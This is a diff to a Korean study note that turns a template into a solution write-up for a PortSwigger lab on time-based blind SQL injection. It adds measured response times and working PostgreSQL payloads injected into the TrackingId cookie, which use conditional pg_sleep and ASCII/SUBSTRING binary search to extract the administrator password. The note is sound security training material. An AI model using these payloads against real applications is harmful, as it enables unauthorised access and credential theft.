@@ -5,7 +5,8 @@ tags:
   - sql-injection
 lab_url: "https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval"
 difficulty: Practitioner
-note_kind: problem
+note_kind: solution
+draft: false
 ---
 
 # Blind SQL injection with time delays and information retrieval
@@ -28,20 +29,48 @@ note_kind: problem
 
 ## 탐색 및 풀이 기록
 
-<!-- 아직 이 실습의 시간 측정이나 비밀번호 확인 결과를 직접 기록하지 않았다. 기준 응답과 조건별 반복 측정을 확보한 뒤 같은 파일에 이어서 적는다. -->
-
 ### 초기 관찰
-<!-- 직접 확인한 내용과 아직 확인하지 못한 점 -->
+
+입력 지점은 상품 페이지 요청의 `TrackingId` 쿠키였다. 정상 요청은 HTTP 200, 본문 3996자로 1.65초 걸렸다. 앞선 문제에서 동작한 `pg_sleep`을 이번에는 조건식의 결과에 따라 실행했다.
+
+~~~sql fragment
+<원래 TrackingId>'||(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
+<원래 TrackingId>'||(SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
+~~~
+
+참 조건은 4.75초, 거짓 조건은 2.11초였다. 두 응답 모두 HTTP 200, 본문 3996자였다. 이 인스턴스에서는 **느린 응답을 참**, 빠른 응답을 거짓으로 구별할 수 있었다.
 
 ### 실행 과정
-<!-- 무엇을 왜 했는지 → 실제 결과 → 해석 -->
-<!-- 필요할 때 코드·요청·응답·스크린샷 첨부 -->
+
+조건식에서 실제 계정 정보에 접근하는지 먼저 확인했다. `administrator`의 비밀번호 길이가 0보다 큰지 물은 요청은 4.58초, 첫 문자의 ASCII 값이 0보다 큰지 물은 요청은 4.52초 걸렸다. 두 조건 모두 지연이 나타났다.
+
+~~~sql fragment
+<원래 TrackingId>'||(SELECT CASE WHEN (
+  (SELECT LENGTH(password) FROM users WHERE username='administrator') > 0
+) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
+~~~
+
+이후 PowerShell에서 `Cookie` 헤더로 요청을 보내고, `1=1`과 `1=2`의 응답 시간을 각각 세 번 측정해 판정 기준을 잡았다. 그 기준으로 비밀번호 길이는 0~64, 각 문자는 출력 가능한 ASCII 값 32~126 범위에서 이진 탐색했다. 매번 중간값보다 큰지 묻고 응답이 느리면 상한 쪽, 빠르면 하한 쪽 범위를 남겼다.
+
+~~~sql fragment
+<원래 TrackingId>'||(SELECT CASE WHEN (
+  (SELECT ASCII(SUBSTRING(password FROM <위치> FOR 1))
+   FROM users WHERE username='administrator') > <중간값>
+) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
+~~~
+
+복원한 문자열은 `users` 테이블의 관리자 비밀번호와 같은지 다시 시간 신호로 검사하도록 했다.
 
 ## 최종 결과
-<!-- 완료 여부와 확인 근거 -->
+
+복원한 비밀번호로 `administrator`에 로그인하자 계정 화면과 실습 완료 배너가 표시됐다.
+
+![administrator 로그인 후 실습 완료 화면](images/lab-time-delays-info-retrieval/01-administrator-solved.png)
 
 ## 배운 점
-<!-- 새로 알게 된 내용, 잘못 생각했던 부분 -->
+
+01.14에서는 지연 자체가 목표였다. 이번에는 같은 지연을 조건이 참일 때만 발생시켜 한 요청에서 참·거짓 한 비트를 읽었다. 기준 시간을 먼저 대조해야 일시적인 느린 응답을 데이터로 오해하지 않는다.
 
 ## 관련 개념
-<!-- 필요한 개념 노트 링크를 목록으로 추가 -->
+
+- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
